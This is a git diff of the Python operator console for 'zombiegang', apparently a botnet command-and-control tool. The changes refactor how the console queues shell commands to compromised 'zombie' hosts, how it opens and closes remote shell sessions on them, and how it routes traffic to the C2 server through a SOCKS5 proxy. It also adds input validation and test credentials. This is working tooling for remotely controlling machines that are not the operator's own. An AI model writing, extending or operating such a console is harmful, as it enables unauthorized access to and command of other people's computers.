@@ -21,15 +21,15 @@ from datetime import datetime
 from time import sleep
 
 
-#############################################
-# testing enviroment                       ##
-#############################################
-zession.username = 'r3nt0n'                ##
-zession.password = 'password'              ##
-zession.remote_host = 'localhost:8080'     ##
-#############################################
+############################################
+# testing enviroment (comment in prd env) ##
+############################################
+zession.username = 'r3nt0n'               ##
+zession.password = 'password'             ##
+zession.remote_host = 'localhost:8080'    ##
+############################################
 
-# tor tests:
+
 
 class ZgangConsole(cmd.Cmd):
     def __init__(self):
@@ -43,14 +43,14 @@ class ZgangConsole(cmd.Cmd):
         self.intro = "{}zombiegang console 0.1~beta 2020{}".format(self.COLOR_WELCOME_BANNER, color.END)
         self.ruler = '-'
 
-        self.doc_header = 'doc_header'
+        self.doc_header = 'commands'
+        self.undoc_header = 'undoc commands'
         self.misc_header = 'misc_header'
-        self.undoc_header = 'undoc_header'
 
         self.env_vars = {
+            'RHOST': zession.remote_host,
             'USER': zession.username,
             'PSWD': zession.password,
-            'RHOST': zession.remote_host,
             'PXHOST': proxy.host,
             'PXPORT': proxy.port
         }
@@ -69,6 +69,14 @@ class ZgangConsole(cmd.Cmd):
         # multisession management
         self.sessions = []
 
+    def cmdloop(self, intro=None):
+        print(self.intro)
+        while True:
+            try:
+                super(ZgangConsole, self).cmdloop(intro="")
+                break
+            except KeyboardInterrupt:
+                print("^C")
 
     def update_prompt(self):
         self.prompt = '{}>{} '.format(self.COLOR_PROMPT,color.END)
@@ -82,7 +90,7 @@ class ZgangConsole(cmd.Cmd):
             self.prompt = ('[{}{}:{}{}]=>({}{}{}) '.format(self.COLOR_PROMPT_TAG_PREFIX, proxy.host, proxy.port, color.END,
                                                             self.COLOR_PROMPT_TAG_PREFIX, proxy.current_ip, color.END) + self.prompt)
 
-        else:
+        elif not zession.token.jwt:
             self.prompt = '{}zgang{} '.format(self.COLOR_PROMPT_TAG, color.END) + self.prompt
 
     def postcmd(self, stop, line):
@@ -110,8 +118,8 @@ class ZgangConsole(cmd.Cmd):
                 zession.username = self.env_vars['USER'] = ''
             if key.upper() == 'RHOST':
                 zession.remote_host = self.env_vars['RHOST'] = ''
-            if key.upper() == 'ZOMBIE':
-                self.env_vars['ZOMBIE'] = ''
+            # if key.upper() == 'ZOMBIE':
+            #     self.env_vars['ZOMBIE'] = ''
             if key.upper() == 'SESSION':
                 self.env_vars['SESSION'] = ''
             if key.upper() == 'PXHOST':
@@ -128,14 +136,22 @@ class ZgangConsole(cmd.Cmd):
                 zession.username = self.env_vars['USER'] = value
             if key.upper() == 'RHOST':
                 zession.remote_host = self.env_vars['RHOST'] = value
-            if key.upper() == 'ZOMBIE':
-                self.env_vars['ZOMBIE'] = value
+            # if key.upper() == 'ZOMBIE':
+            #     self.env_vars['ZOMBIE'] = value
             if key.upper() == 'SESSION':
                 self.env_vars['SESSION'] = value
+                if value not in self.sessions:
+                    self.sessions.append(value)
             if key.upper() == 'PXHOST':
-                self.env_vars['PXHOST'] = value
+                if (validate(ValidRegex.IpAddress, value)) or (validate(ValidRegex.Hostname,value)):
+                    self.env_vars['PXHOST'] = value
+                else:
+                    logger.log('error in "{}", not a valid ip address/hostname'.format(value), 'ERROR')
             if key.upper() == 'PXPORT':
-                self.env_vars['PXPORT'] = value
+                if validate(ValidRegex.Port, value):
+                    self.env_vars['PXPORT'] = value
+                else:
+                    logger.log('error in "{}", not a valid port'.format(value), 'ERROR')
 
 
     def complete_set(self, text, line, begidx, endidx):
@@ -174,12 +190,14 @@ class ZgangConsole(cmd.Cmd):
         return [s[offs:] for s in self.env_vars if s.startswith(mline)]
 
     def do_proxy(self, line):
+        """enable/disable tunneling connection trough socks5 proxy to reach cc server"""
         if proxy.host:
             proxy.remove()
             logger.log('socks5 proxy session {}:{} removed'.format(proxy.host, proxy.port), 'INFO')
         else:
             input_host = self.env_vars['PXHOST']
             input_port = self.env_vars['PXPORT']
+            # here regexp is double checked, maybe i should remove it
             if (validate(ValidRegex.IpAddress, input_host) or validate(ValidRegex.Hostname, input_host)) and validate(
                     ValidRegex.Port, input_port):
                 input_host = str(input_host)
@@ -190,10 +208,10 @@ class ZgangConsole(cmd.Cmd):
                 logger.log('current public ip: {} (cc: {})'.format(proxy.current_ip, proxy.country.upper()), 'OPTION')
                 print('')  # line break
             else:
-                logger.log('regexp error in {}:{} while trying to create socks5 proxy session'.format(proxy.host, proxy.port), 'ERROR')
+                logger.log('trying to create socks5 proxy session: regexp error in {}:{}'.format(proxy.host, proxy.port), 'ERROR')
 
     def do_get(self, line):
-        """get data from remote cc server"""
+        """get data from remote cc server - syntax: get <data_type>"""
         data_rcv = []
         input_data = line.split()
         params = []
@@ -238,6 +256,12 @@ class ZgangConsole(cmd.Cmd):
         offs = len(mline) - len(text)
         return [(s+'s')[offs:] for s in self.data_types if (s+'s').startswith(mline)]
 
+    def do_create(self):
+        pass
+
+    def complete_create(self, text, line, begidx, endidx):
+        return self.complete_get(text, line, begidx, endidx)
+
     def create_cmd_task(self, zombie_id, command='echo "hello word"'):
         if command == 'exit':
             self.do_stop(zombie_id)
@@ -245,45 +269,53 @@ class ZgangConsole(cmd.Cmd):
             self.env_vars['SESSION'] = ''
 
         if len(zombie_id) > 0:
-            task = Task('cmd')
-            task.task_name = datetime.now().strftime('%Y-%m-%d_%H:%M:%S')
-            task.task_content = command
-            if task.create():
-
-                mission = Mission()
-                mission.task_id = task.id
-                logger.log('task created, trying to create mission for each zombie selected', 'DEBUG')
-                mission.zombie_username = crud.read_data('zombies', {'id': zombie_id})[0]['username']
-                if mission.create():
-                    self.executed_missions.put(mission)
-                    logger.log('mission {} created'.format(mission), 'DEBUG')
-
+            from app.controllers import TaskController
+            selected_zombie = crud.read_data('zombies', {'id': zombie_id})[0]['username']
+            task_controller = TaskController('cmd')
+            if task_controller.run(
+                    task_data={'task_name': datetime.now().strftime('%Y-%m-%d_%H:%M:%S'),
+                               'task_content': command},
+                    selected_zombies=[selected_zombie]):
+                self.executed_missions.put(task_controller.last_created_mission)
+                logger.log('mission {} created'.format(task_controller.last_created_mission), 'DEBUG')
 
     def create_rsh_task(self, line, toggle='on'):
-        zombie_ids = line.split()
-        if len(zombie_ids) < 1:
-            logger.log('zombie_id is required (enter ? start to see cmd syntax)', 'ERROR')
-        else:
-            task = Task('rsh')
-            task.task_name = datetime.now().strftime('%Y-%m-%d_%H:%M:%S')
-            task.task_content = toggle
-            if task.create():
-                for z_id in zombie_ids:
-                    mission = Mission()
-                    mission.task_id = task.id
-                    logger.log('task created, trying to create mission for each zombie selected', 'DEBUG')
-                    mission.zombie_username = (crud.read_data('zombies', {'id': z_id}))[0]['username']
-                    if mission.create():
-                        self.executed_missions.put(mission)
-                        logger.log('mission {} created'.format(mission), 'DEBUG')
-                        self.env_vars['SESSION'] = z_id
-                        if toggle == 'on':
-                            self.sessions.append(z_id)
-                            logger.log('waiting for zombie confirm to start session...', 'OTHER')
-                        else:
-                            self.sessions.remove(z_id)
-                if (len(zombie_ids) == 0) or (self.env_vars['SESSION'] not in self.sessions):
-                    self.env_vars['SESSION'] = ''
+        zombie_id = line.split()
+        if (len(zombie_id) != 1):
+            if (self.env_vars['SESSION']):
+                zombie_id = [self.env_vars['SESSION']]
+            else:
+                logger.log('zombie_id is required (enter ? start to see cmd syntax)', 'ERROR')
+                return False
+
+        zombie_id = zombie_id[0]
+        from app.controllers import TaskController
+        selected_zombie = False
+        try:
+            selected_zombie = crud.read_data('zombies', {'id': zombie_id})[0]['username']
+        except TypeError:
+            logger.log('zombie {} not found'.format(zombie_id), 'ERROR')
+        if selected_zombie:
+            task_controller = TaskController('rsh')
+            if task_controller.run(
+                    task_data={'task_name': datetime.now().strftime('%Y-%m-%d_%H:%M:%S'),
+                               'task_content': toggle},
+                    selected_zombies=[selected_zombie]):
+
+                self.executed_missions.put(task_controller.last_created_mission)
+                logger.log('mission {} created'.format(task_controller.last_created_mission), 'DEBUG')
+                self.env_vars['SESSION'] = zombie_id
+                if (toggle == 'on') and (zombie_id not in self.sessions):
+                    self.sessions.append(zombie_id)
+                    logger.log('waiting for zombie confirm to start session...', 'OTHER')
+                else:
+                    try:
+                        self.sessions.remove(zombie_id)
+                    except ValueError:
+                        pass
+
+            if self.env_vars['SESSION'] not in self.sessions:
+                self.env_vars['SESSION'] = ''
 
     def do_start(self, line):
         """start a remote shell session - syntax: start <zombie_id>"""
@@ -299,7 +331,7 @@ class ZgangConsole(cmd.Cmd):
         return [s[offs:] for s in self.sessions if (str(s)).startswith(mline)]
 
     def do_login(self, line):
-        """log in to remote cc server"""
+        """log in to remote cc server (set USER, PSWD and RHOST before run this command)"""
         if zession.username and zession.password and zession.remote_host:
             if (
                     (validate(ValidRegex.Username, zession.username) and validate(ValidRegex.Password, zession.password)) and
@@ -308,7 +340,7 @@ class ZgangConsole(cmd.Cmd):
             ):
                 if zession.login(zession.username, zession.password, zession.remote_host):
                     logger.log('logged as {} at {}'.format(zession.username, zession.remote_host), 'SUCCESS')
-                    self.env_vars['ZOMBIE'] = ''
+                    self.env_vars['SESSION'] = ''
                 else:
                     logger.log('error trying to log into {}'.format(zession.remote_host), 'ERROR')
             else:
@@ -320,7 +352,7 @@ class ZgangConsole(cmd.Cmd):
                     logger.log('{} is required'.format(field), 'ERROR')
 
     def emptyline(self):
-        pass  # overwrites default behaviour (execute last command)
+        pass  # overwrites default behaviour (which is execute last command)
 
     def default(self, line):
         command = line
@@ -395,43 +427,30 @@ class ZgangConsole(cmd.Cmd):
             except queue.Empty:
                 pass
 
-    # def output_thread(self):
-    #     logger.log('initiating output stream thread...', 'DEBUG')
-    #     while not self.kill:
-    #         if zession.token.jwt:
-    #             zession.check_for_refresh()
-    #
-    #         # ...
-    #         # logger.log('prueba', 'ERROR')
-    #         pass
-
     def run(self):
         threads = []
-        o_thread = threading.Thread(name='o_thread', target=self.output_thread)#, args=((self.self,)))
-        threads.append(o_thread)
-        # exe_thread = threading.Thread(name='exe_thread', target=self.executor_thread)#, args=((self.self,)))
-        # threads.append(exe_thread)
-        i_thread = threading.Thread(name='i_thread', target=self.input_thread)#, args=((self.self,)))
-        threads.append(i_thread)
+        try:
+            o_thread = threading.Thread(name='o_thread', target=self.output_thread)#, args=((self.self,)))
+            threads.append(o_thread)
+            i_thread = threading.Thread(name='i_thread', target=self.input_thread)#, args=((self.self,)))
+            threads.append(i_thread)
+            # Start all threads
+            for t in threads:
+                t.setDaemon(True)
+                t.start()
 
-        # Start all threads
-        for t in threads:
-            t.setDaemon(True)
-            t.start()
-        # Wait for all of them to finish
-        for t in threads:
-            t.join()
+        except KeyboardInterrupt:
+            logger.log('manual exit requested', 'CRITICAL')
+
+        except Exception as e:
+            logger.log('CRITICAL ERROR: {}'.format(e), 'CRITICAL')
+
+        finally:
+            # Wait for all of them to finish
+            for t in threads:
+                t.join()
 
 
 if __name__ == '__main__':
-    # while True:
-    #     try:
     console = ZgangConsole()
     console.run()
-
-        # except KeyboardInterrupt:
-        #     logger.log('manual exit requested \n\nPRESS Ctrl+C again...', 'CRITICAL')
-        #
-        # except Exception as e:
-        #     logger.log('CRITICAL ERROR: {}'.format(e), 'CRITICAL')
-        #     logger.log('trying to restart connection', 'INFO')
